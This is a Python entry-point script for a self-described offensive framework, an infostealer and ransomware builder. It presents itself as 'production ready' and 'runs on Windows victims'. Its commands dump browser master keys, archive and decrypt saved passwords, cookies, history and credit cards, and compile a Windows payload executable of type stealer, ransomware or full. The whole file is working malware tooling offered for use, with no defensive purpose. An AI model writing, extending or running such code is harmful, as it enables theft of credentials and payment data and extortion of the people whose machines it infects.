#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Prometheus Offensive Framework v1.0
-----------------------------------
Sovereign, modular, cross-platform payload orchestration engine.
Builds on Ubuntu, runs on Windows victims.

Author: Prometheus-Up-Fable-Cyclops
Status: PRODUCTION_READY | CROSS-PLATFORM
"""

import sys
import os
import argparse
import logging
import json
from pathlib import Path

# Ensure the current directory is in the path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.cross_host import (
    dump_keys,
    archive_profile,
    restore_from_archive,
    KeyDump,
    MasterKeys,
    Vault,
    find_browser_profiles,
    find_firefox_profiles,
    decrypt_value,
    decrypt_login_data,
    decrypt_cookies,
    extract_history,
    extract_bookmarks,
    decrypt_credit_cards,
    IS_LINUX,
    IS_WINDOWS,
)


def setup_logging(verbose: bool = False):
    """Setup logging configuration."""
    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format='[%(asctime)s] [%(levelname)s] %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    return logging.getLogger(__name__)


def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Prometheus Offensive Framework - Payload Orchestration Engine",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Run GUI mode (default)
  python main.py
  
  # Headless build
  python main.py --headless --config config/config.json
  
  # Cross-host dump keys
  python main.py dumpkeys -p /path/to/profile -o keys.json
  
  # Cross-host archive
  python main.py archive -p /path/to/profile -o data.zip
  
  # Cross-host restore
  python main.py restore -k keys.json -a data.zip -o decrypted/
  
  # Generate Windows payload
  python main.py build --output payload.exe
        """
    )
    
    # Global flags
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Enable verbose logging"
    )
    parser.add_argument(
        "--config",
        type=str,
        default="config/config.json",
        help="Path to configuration file"
    )
    
    subparsers = parser.add_subparsers(dest="command", help="Command to run")
    
    # GUI mode (default)
    parser.set_defaults(command="gui")
    
    # Headless build
    build_parser = subparsers.add_parser("build", help="Build payload")
    build_parser.add_argument(
        "--output",
        type=str,
        default="dist/payload.exe",
        help="Output file path"
    )
    build_parser.add_argument(
        "--type",
        choices=["stealer", "ransomware", "full"],
        default="full",
        help="Payload type"
    )
    
    # Dump keys
    dumpkeys_parser = subparsers.add_parser("dumpkeys", help="Dump master keys")
    dumpkeys_parser.add_argument(
        "-p", "--profile",
        required=True,
        help="Browser profile path"
    )
    dumpkeys_parser.add_argument(
        "-t", "--type",
        default="chromium",
        choices=["chromium", "firefox"],
        help="Browser type"
    )
    dumpkeys_parser.add_argument(
        "-o", "--output",
        default="keys.json",
        help="Output file"
    )
    
    # Archive
    archive_parser = subparsers.add_parser("archive", help="Archive profile data")
    archive_parser.add_argument(
        "-p", "--profile",
        required=True,
        help="Browser profile path"
    )
    archive_parser.add_argument(
        "-t", "--type",
        default="chromium",
        choices=["chromium", "firefox"],
        help="Browser type"
    )
    archive_parser.add_argument(
        "-o", "--output",
        default="browser-data.zip",
        help="Output archive file"
    )
    archive_parser.add_argument(
        "-c", "--categories",
        default="password,cookie,history",
        help="Comma-separated categories"
    )
    
    # Restore
    restore_parser = subparsers.add_parser("restore", help="Restore and decrypt")
    restore_parser.add_argument(
        "-k", "--keys",
        required=True,
        help="Keys JSON file"
    )
    restore_parser.add_argument(
        "-a", "--archive",
        required=True,
        help="Data archive file"
    )
    restore_parser.add_argument(
        "-o", "--output",
        default="decrypted",
        help="Output directory"
    )
    
    return parser.parse_args()


def load_config(config_path: str) -> dict:
    """Load configuration from JSON file."""
    if os.path.exists(config_path):
        with open(config_path, "r") as f:
            return json.load(f)
    return {}


def cmd_dumpkeys(args, logger):
    """Execute dumpkeys command."""
    logger.info(f"Dumping keys from: {args.profile}")
    dump = dump_keys(args.profile, args.type)
    with open(args.output, "w") as f:
        json.dump(dump.to_dict(), f, indent=2)
    logger.info(f"Keys exported to: {args.output}")
    for vault in dump.vaults:
        logger.info(f"  - {vault.browser}: {len(vault.profiles)} profiles")


def cmd_archive(args, logger):
    """Execute archive command."""
    logger.info(f"Archiving: {args.profile}")
    categories = args.categories.split(",") if args.categories != "all" else None
    count = archive_profile(args.profile, args.output, categories, args.type)
    logger.info(f"Archived {count} files to: {args.output}")


def cmd_restore(args, logger):
    """Execute restore command."""
    logger.info(f"Restoring from: {args.keys} and {args.archive}")
    results = restore_from_archive(args.keys, args.archive, args.output)
    logger.info(f"Decrypted {len(results)} profiles to: {args.output}/")
    for name, data in results.items():
        for cat, entries in data.items():
            logger.info(f"  - {name}/{cat}: {len(entries)} entries")


def cmd_build(args, logger, config):
    """Execute build command."""
    logger.info(f"Building payload: {args.output}")
    
    # Check if we're on Windows or Linux
    if IS_LINUX:
        logger.info("Building on Linux - using cross-compilation")
        # Use pyinstaller with Wine or native
        import subprocess
        cmd = [
            "pyinstaller",
            "--onefile",
            "--windowed",
            "--name", os.path.basename(args.output).replace(".exe", ""),
            "--distpath", os.path.dirname(args.output),
            "--add-data", "core:core",
            "--add-data", "payload/templates:payload/templates",
            "--hidden-import", "cryptography",
            "--hidden-import", "sqlite3",
            "--hidden-import", "json",
            "--hidden-import", "pywin32",
            "--hidden-import", "win32crypt",
            "main.py"
        ]
        subprocess.run(cmd, check=False)
    else:
        logger.info("Building on Windows - native compilation")
        # Native Windows build
        import PyInstaller.__main__
        PyInstaller.__main__.run([
            "main.py",
            "--onefile",
            "--windowed",
            "--name", os.path.basename(args.output).replace(".exe", ""),
            "--distpath", os.path.dirname(args.output),
            "--add-data", "core;core",
            "--add-data", "payload/templates;payload/templates",
            "--hidden-import", "cryptography",
            "--hidden-import", "sqlite3",
            "--hidden-import", "json",
            "--hidden-import", "pywin32",
            "--hidden-import", "win32crypt",
        ])
    
    logger.info(f"Build complete: {args.output}")


def cmd_gui(args, logger, config):
    """Execute GUI mode."""
    logger.info("Starting GUI mode...")
    try:
        from gui.app import PrometheusApp
        from core.engine import Engine
        from core.crypto import SecureStore
        
        engine = Engine(secure_store=SecureStore())
        app = PrometheusApp(engine)
        app.run()
    except ImportError as e:
        logger.error(f"GUI dependencies not installed: {e}")
        logger.info("Run in headless mode instead")
        sys.exit(1)


def main():
    """Main entry point."""
    args = parse_arguments()
    logger = setup_logging(args.verbose)
    config = load_config(args.config)
    
    logger.info(f"Platform: {'Linux' if IS_LINUX else 'Windows'}")
    logger.info(f"Command: {args.command}")
    
    # Dispatch commands
    if args.command == "dumpkeys":
        cmd_dumpkeys(args, logger)
    elif args.command == "archive":
        cmd_archive(args, logger)
    elif args.command == "restore":
        cmd_restore(args, logger)
    elif args.command == "build":
        cmd_build(args, logger, config)
    else:  # gui or default
        cmd_gui(args, logger, config)


if __name__ == "__main__":
    main()
